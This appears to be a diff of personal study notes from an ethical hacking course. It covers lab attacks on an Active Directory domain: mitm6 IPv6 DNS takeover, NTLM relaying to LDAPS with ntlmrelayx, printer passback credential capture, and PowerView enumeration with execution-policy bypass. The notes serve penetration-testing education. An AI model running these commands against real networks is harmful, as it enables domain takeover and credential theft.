@@ -1,7 +1,4 @@
 
-# Practical Ethical Hacking - The Complete Course
-
-
 
 ## Before We Begin
 
@@ -2785,6 +2782,7 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 > [!todo] 
 > Download:
 > `git clone https://github.com/dirkjanm/mitm6`
+> `sudo -s`
 > `pip3 install -r requirements.txt`
 
 ### Setting Up LDAPS
@@ -2814,3 +2812,196 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 > [!faq] 
 >**Question**: My ntlmrelayx is giving an error during the attack. How can I resolve?
   **Resolution**: Impacket versions > 0.9.19 are unstable and causing issues for students and pentesters alike. Try purging impacket completely and downloading 0.9.19 from here: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases)
+
+> [!todo] 
+> Run mitm6:
+> `sudo -s`
+> `sudo mitm6 -d marvel.local` 
+
+![[Pasted image 20230315075658.png]]
+
+> [!todo]  
+> Run Relay Attack (IP of DC):
+> `impacket-ntlmrelayx -6 -t ldaps://192.168.203.136 -wh fakewpad.marvel.local -l lootme
+`
+
+> [!todo] 
+> Reboot Domain Controller.
+> Normally DC refresh DNS every 30 min. With Reboot we speed up this process.
+
+![[Pasted image 20230315080145.png]]
+
+![[Pasted image 20230315080248.png]]
+
+> [!todo] 
+> Run:
+> `firefox domain_users_by_group.html`  
+
+![[Pasted image 20230315080459.png]]
+
+> [!todo] 
+> Login with Domain Admininistrator to our Windows 10 VM
+> 
+
+> [!info] 
+> Take Over Domain Controller
+> 
+
+> [!warning] 
+> Fix :  (All commands are executed on the Domain Controller)
+>  start / run / cmd  ( as administrator )
+>  `powershell -ep bypass`
+>  `Uninstall-AdcsCertificationAuthority`
+>  hit A for all 
+>  Reboot the DC 
+>  ---
+>  Login to DC as Administrator 
+>  start / run / cmd (as administrator)
+>  `powershell -ep bypass`
+>  (command is one very long line not multiple lines)
+>  `Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" -KeyLength 2048 -HashAlgorithmName SHA1 -ValidityPeriod Years -ValidityPeriodUnits 99`
+>  hit A for all 
+>  Reboot the DC
+>  ---
+>  Login to DC
+>  Re-attempt attack in kali
+>  `sudo mitm6 -d marvel.local`
+> `sudo ntlmrelayx.py -6 -t ldaps://your.dc.ip.here -wh fakewpad.marvel.local -l lootme`
+
+![[Pasted image 20230316100736.png]]
+
+![[Pasted image 20230316100820.png]]
+
+![[Pasted image 20230316101259.png]]
+
+> [!tip] 
+> IPv6 Attacks are very powerful, see more in detailed article here:
+> https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
+> **The mitm6 attack**
+> - Attack phase 1 – Primary DNS takeover
+> - Attack phase 2 – DNS spoofing
+> - Exploiting WPAD (Windows Proxy Auto Detection)
+> - The full attack
+> - Defenses and mitigations
+> - Detection
+> ---
+> The worst of both worlds: Combining NTLM Relaying and Kerberos delegation
+> https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+> `Example of insecure Active Directory default`
+> - Attack TL;DR
+> - No credentials, no problem
+> 	- By default, any user in Active Directory can create up to 10 computer accounts
+> 	- Computer account credentials can be used for all kinds of things in AD, such as querying domain information or even running BloodHound:
+> - Relaying and configuring delegation
+> - Other abuse avenues
+> - Tools
+> - Mitigations
+
+### IPv6 Attack Defenses
+
+![[Pasted image 20230316104911.png]]
+
+### Passback Attacks
+
+> [!info] 
+>  A Pen Tester’s Guide to Printer Hacking
+>  https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
+
+![[Pasted image 20230316110458.png]]
+
+> [!tip] 
+> **Passback Attack:**
+> If you can't see Password on device, point IP to your device and you can see request with credentials. 
+> 
+
+
+### Other Attack Vectors and Strategies
+
+![[Pasted image 20230316110928.png]]
+
+> [!info] 
+> http_version is a Module in Metasploit to look for Websites inside network.
+> 
+
+> [!tip] 
+> A printer can give you in some cases Domain Admin Access
+> Scan and Share feature sometimes use Domain Admin to save scans via SMB
+
+> [!hint] 
+> Always look up default credential of services / sites you discover inside network
+> 
+
+
+## Attacking Active Directory: Post-Compromise Enumeration
+
+### PowerView Overview
+
+> [!info] 
+> Download PowerView:
+> https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+> 
+
+### Domain Enumeration with PowerView
+
+> [!info] 
+>  Resources for this video:
+>  PowerView Cheat Sheet: [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+> [!todo] 
+> - Open `cmd` on Windows Machine 
+> - `powershell -ep bypass`
+> - Load PowerView: `. .\PowerView.ps1`
+> - `Get-NetDomain`
+> - `Get-NetDomainController`
+> - `Get-DomainPolicy`
+> - `(Get-DomainPolicy)."SystemAccess"`
+> - `Get-NetUser`
+> - `Get-NetUser | select cn`
+> - `Get-NetUser | select Description`
+> - `Get-DomainUser`
+> - `Get-DomainUser -Properties pwdlastset`
+> - `Get-DomainUser -Properties logoncount`
+> - `Get-DomainUser -Properties badpwdcount`
+> - `Get-NetComputer`
+> - `Get-NetComputer | select OperatingSystem`
+> - `Get-NetGroup`
+> - `Invoke-ShareFinder`
+> - `Get-NetGPO`
+> - `Get-NetGPO | select displayname, whenchanged`
+
+![[Pasted image 20230317064634.png]]
+
+![[Pasted image 20230317064650.png]]
+
+![[Pasted image 20230317065138.png]]
+
+![[Pasted image 20230317065400.png]]
+
+![[Pasted image 20230317065446.png]]
+
+![[Pasted image 20230317065527.png]]
+
+![[Pasted image 20230317065603.png]]
+
+![[Pasted image 20230317082030.png]]
+
+![[Pasted image 20230317082042.png]]
+
+![[Pasted image 20230317082131.png]]
+> [!warning] 
+> If you see a user never logged in, maybe this is a **honeypot** account 
+
+![[Pasted image 20230317082254.png]]
+
+![[Pasted image 20230317082436.png]]
+
+![[Pasted image 20230317082617.png]]
+
+![[Pasted image 20230317082814.png]]
+
+![[Pasted image 20230317083154.png]]
+
+![[Pasted image 20230317083258.png]]
+
+![[Pasted image 20230317083413.png]]
+
